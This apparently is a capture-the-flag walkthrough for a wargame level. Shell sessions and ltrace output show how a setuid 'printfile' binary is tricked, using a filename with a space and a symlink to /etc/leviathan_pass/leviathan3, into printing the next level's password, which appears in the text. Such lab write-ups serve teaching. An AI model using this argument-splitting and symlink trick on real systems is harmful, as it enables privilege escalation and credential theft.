Solution of this problem is to understand how to use ls(for creating links) and ltrace

```
leviathan2@gibson:~$ mktemp -d
/tmp/tmp.KKZX22AOau
leviathan2@gibson:~$ ltrace ./printfile /tmp/tmp.KKZX22AOau/"output key.txt"
__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
access("/tmp/tmp.KKZX22AOau/output key.t"..., 4)                                                                                                  = 0
snprintf("/bin/cat /tmp/tmp.KKZX22AOau/out"..., 511, "/bin/cat %s", "/tmp/tmp.KKZX22AOau/output key.t"...)                                        = 43
geteuid()                                                                                                                                         = 12002
geteuid()                                                                                                                                         = 12002
setreuid(12002, 12002)                                                                                                                            = 0
system("/bin/cat /tmp/tmp.KKZX22AOau/out".../bin/cat: /tmp/tmp.KKZX22AOau/output: No such file or directory
/bin/cat: key.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                            = 256
+++ exited (status 0) +++
leviathan2@gibson:~$ cd /tmp/tmp.KKZX22AOau
leviathan2@gibson:/tmp/tmp.KKZX22AOau$ touch output.txt
leviathan2@gibson:/tmp/tmp.KKZX22AOau$ chmod 777 /tmp/tmp.BykcxJXZxD

leviathan2@gibson:/tmp/tmp.KKZX22AOau$ ls -la /tmp/tmp.BykcxJXZxD
total 26048
drwxrwxrwx    2 leviathan2 leviathan2     4096 Jun  8 14:52 .
drwxrwx-wt 3959 root       root       26652672 Jun 16 07:01 ..
-rw-rw-r--    1 leviathan2 leviathan2        0 Jun  8 14:51 file.txt
lrwxrwxrwx    1 leviathan2 leviathan2       30 Jun  8 14:50 test -> /etc/leviathan_pass/leviathan3
-rwxrwxrwx    1 leviathan2 leviathan2        0 Jun 11 10:02 test file.txt
leviathan2@gibson:/tmp/tmp.KKZX22AOau$ ./printfile /tmp/tmp.BykcxJXZxD/"test file.txt"
-bash: ./printfile: No such file or directory
leviathan2@gibson:/tmp/tmp.KKZX22AOau$ cd
leviathan2@gibson:~$ ./printfile /tmp/tmp.BykcxJXZxD/"test file.txt"
f0n8h2iWLP
/bin/cat: file.txt: No such file or directory
